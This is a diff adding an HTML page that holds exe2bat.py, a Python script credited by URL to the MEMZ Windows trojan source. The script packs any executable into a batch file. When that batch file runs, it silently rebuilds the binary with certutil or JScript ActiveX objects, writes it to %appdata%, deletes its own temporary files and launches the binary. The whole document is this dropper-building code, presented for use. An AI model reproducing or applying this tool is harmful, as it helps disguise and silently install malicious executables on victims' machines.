@@ -1,0 +1,108 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>exe2bat.py</title>
+</head><body>https://raw.githubusercontent.com/Leurak/MEMZ/master/WindowsTrojan/Source/exe2bat.py <br/>
+<br/>
+# Very poorly coded exe (or other file) to batch converter.<br/>
+#<br/>
+# If you want to use it, don't forget to append -zip to the command line,<br/>
+# because this is the best method for packing the file.<br/>
+<br/>
+import sys, os, base64, zipfile<br/>
+<br/>
+use_zip = &quot;-zip&quot; in sys.argv<br/>
+for_xp = &quot;-xp&quot; in sys.argv<br/>
+use_script = &quot;-zip&quot; in sys.argv or &quot;-xp&quot; in sys.argv<br/>
+<br/>
+ZIP_NAME = &quot;z.zip&quot;<br/>
+EXE_NAME = sys.argv[3]<br/>
+BASE64_NAME = &quot;x&quot;<br/>
+JS_NAME = &quot;x.js&quot;<br/>
+<br/>
+def writeScript(script, path):<br/>
+	out = &quot;&quot;<br/>
+	i = 0<br/>
+	<br/>
+	for line in script.splitlines():<br/>
+		if i == 0:<br/>
+			out += 'echo %s&gt;%s\r\n' % (batchescape(line), path)<br/>
+		else:<br/>
+			out += 'echo %s&gt;&gt;%s\r\n' % (batchescape(line), path)<br/>
+		<br/>
+		i+=1<br/>
+		<br/>
+	return out<br/>
+	<br/>
+def batchescape(s):<br/>
+	chrs = '&lt;&gt;|&quot;&amp;'<br/>
+	<br/>
+	for c in chrs:<br/>
+		s = s.replace(c, &quot;^&quot;+c)<br/>
+		<br/>
+	return s#.replace(&quot;%&quot;, &quot;%%&quot;)<br/>
+<br/>
+out = &quot;@echo off\r\n\r\n&quot;<br/>
+<br/>
+fn = sys.argv[1]<br/>
+<br/>
+if use_zip:<br/>
+	with zipfile.ZipFile(&quot;temp.zip&quot;, &quot;w&quot;) as z:<br/>
+		z.write(sys.argv[1], EXE_NAME, zipfile.ZIP_DEFLATED)<br/>
+	<br/>
+	fn = &quot;temp.zip&quot;<br/>
+<br/>
+ifile = open(fn, &quot;rb&quot;)<br/>
+inp = ifile.read()<br/>
+ifile.close()<br/>
+<br/>
+b64 = base64.encodestring(inp)<br/>
+out += writeScript(b64, BASE64_NAME)<br/>
+<br/>
+if use_zip:<br/>
+	os.remove(&quot;temp.zip&quot;)<br/>
+	<br/>
+if use_script:<br/>
+	out += &quot;\r\n&quot;<br/>
+	<br/>
+if use_zip:<br/>
+	js = &quot;&quot;&quot;f=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);i=f.getFile(&quot;%s&quot;).openAsTextStream();<br/>
+x=new ActiveXObject(&quot;MSXml2.DOMDocument&quot;).createElement(&quot;Base64Data&quot;);x.dataType=&quot;bin.base64&quot;;<br/>
+x.text=i.readAll();o=new ActiveXObject(&quot;ADODB.Stream&quot;);o.type=1;o.open();o.write(x.nodeTypedValue);<br/>
+z=f.getAbsolutePathName(&quot;%s&quot;);o.saveToFile(z);s=new ActiveXObject(&quot;Shell.Application&quot;);<br/>
+s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();&quot;&quot;&quot; % (BASE64_NAME, ZIP_NAME)<br/>
+<br/>
+	out += writeScript(js, JS_NAME)<br/>
+elif for_xp:<br/>
+	js = &quot;&quot;&quot;i=WScript.createObject(&quot;Scripting.FileSystemObject&quot;).getFile(&quot;%s&quot;).openAsTextStream();<br/>
+x=WScript.createObject(&quot;MSXml2.DOMDocument&quot;).createElement(&quot;Base64Data&quot;);x.dataType=&quot;bin.base64&quot;;<br/>
+x.text=i.readAll();o=WScript.createObject(&quot;ADODB.Stream&quot;);o.type=1;o.open();o.write(x.nodeTypedValue);<br/>
+o.saveToFile(&quot;%s&quot;);o.close();i.close();&quot;&quot;&quot; % (BASE64_NAME, EXE_NAME)<br/>
+<br/>
+	out += writeScript(js, JS_NAME)<br/>
+<br/>
+out += &quot;\r\n&quot;<br/>
+<br/>
+out += 'set v=&quot;%%appdata%%\\%s&quot;\r\n' % EXE_NAME<br/>
+out += &quot;del %v% &gt;NUL 2&gt;NUL\r\n&quot;<br/>
+<br/>
+if use_script:<br/>
+	out += &quot;cscript %s &gt;NUL 2&gt;NUL\r\n&quot; % JS_NAME<br/>
+	out += &quot;del %s &gt;NUL 2&gt;NUL\r\n&quot; % JS_NAME<br/>
+else:<br/>
+	out += &quot;certutil -decode %s %%v%% &gt;NUL 2&gt;NUL\r\n&quot; % BASE64_NAME<br/>
+<br/>
+if for_xp:<br/>
+	out += &quot;move %s %%v%% &gt;NUL 2&gt;NUL\r\n&quot; % EXE_NAME<br/>
+	<br/>
+if use_zip:<br/>
+	out += &quot;del %s &gt;NUL 2&gt;NUL\r\n&quot; % ZIP_NAME<br/>
+	<br/>
+out += &quot;del %s &gt;NUL 2&gt;NUL\r\n&quot; % BASE64_NAME<br/>
+out += 'start &quot;&quot; %v%'<br/>
+<br/>
+ofile = open(sys.argv[2], &quot;wb&quot;)<br/>
+ofile.write(out)<br/>
+ofile.close()<br/>
+<br/>
+print len(out), &quot;characters.&quot;</body></html>
